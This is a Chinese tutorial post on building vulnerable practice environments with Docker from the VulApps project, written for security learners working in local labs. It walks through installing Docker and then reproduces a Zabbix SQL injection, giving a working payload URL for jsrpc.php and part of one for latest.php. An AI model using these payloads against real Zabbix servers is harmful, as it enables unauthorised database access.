手把手教你使用docker搭建漏洞环境，妈妈再也不用担心我以后做实验没有漏洞环境啦~

  
文末我会附上《docker从入门到实践》的百度云链接，前几章写的通俗易懂。  
  
对于docker，因为我不是搞云的，不太了解docker的一些太深的东西。  
  
但是我清楚它的优点：可以快速部署应用，占用磁盘的空间小，对于只需要一个漏洞环境来练习的我们来说非常方便。  
  
普通的系统镜像少说1个G，安装好虚拟机之后大概要10多G。这样不仅安装复杂，耗系统资源大，运行速度慢，而且还不利于大家交流和共享。  
  
而docker的镜像和docker容器要远比虚拟机小，方便在Internet上传输。  
  
目前已经有很多存储docker镜像的网站，官方的是Docker Hub，国内有Docker Hub的镜像服务 DaoCloud。  
  
我也是看了一个公众号（inn0team）的文章才有了一个想法：如果大家把有漏洞的环境做成docker镜像共享出来，那么每个人就会有更多的漏洞环境，对于自身技术的提升也是很有好处的。  
  
目前inn0team在github上创建了这个项目，如果大家知道其它的开源项目，麻烦留个言谢谢~  
  
项目地址： https://github.com/Medicean/VulApps  
  
目前这个仓库里面只有 10 个漏洞环境:  
  
Bash 破壳漏洞（CVE-2014-6271 和 CVE-2014-7169）  
OpenSSL HeartBleed（心脏出血）  
struts2 (s2-032, s2-033, s2-037, s2-devMode)  
WordPress Double Opt-In for Download Plugin 2.0.9 SQL 注入漏洞  
Zabbix 2.2.x/3.0.x SQL 注入漏洞 (latest.php 和 jsrpc.php)  
  
  
说了这么多，下面来介绍docker环境搭建和使用。  
我用的系统是ubuntu16.04。不懂linux的同学也不要着急，windows下有带图形界面的docker。  
  
以root权限运行如下命令安装最新版docker：  
apt-get install apt-transport-https   
apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 36A1D7869245C8950F966E92D8576A8BA88D21E9  
bash -c "echo deb https://get.docker.io/ubuntu docker main > /etc/apt/sources.list.d/docker.list"  
apt-get update  
apt-get install lxc-docker  
apt-get install docker.io  
安装完之后启动docker服务：  
service docker start  
  
下载带有漏洞环境的docker镜像：  
\# docker pull medicean/vulapps:z\_zabbix\_1  
  
启动 Zabbix 漏洞环境：  
  
\# docker run -d -p 8000:80 medicean/vulapps:z\_zabbix\_1  
  
  
说明一下， -d 表示以守护形式启动， -p 意思是把容器的 80 端口映射到本机的 8000 端口  
  
复现漏洞  
  
  
1\. 访问 http://127.0.0.1:8000/ 可以看到服务已经启动  
  
![](../Images/90c68c63fc81d41588b041f899733f54.png)

3.注入有两处，第一处在/jsrpc.php,  
  
payload：  
http://127.0.0.1:8000/jsrpc.php?sid=e7f0bfd2555170c0&type=9&method=screen.get×tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter\_task=&mark\_color=1  
  
  
注意payload中sid，是你登陆后cookie中zbx\_sessionid字段的后16位。  
  
![](../Images/bd61330c62e19723c60d92771fe71ee6.png)   
可以看到经典的报错了~

http://127.0.0.1:8000/latest.php ... \_state=1&toggle\_ids\[\]=1%^&\*"'()\-\*#
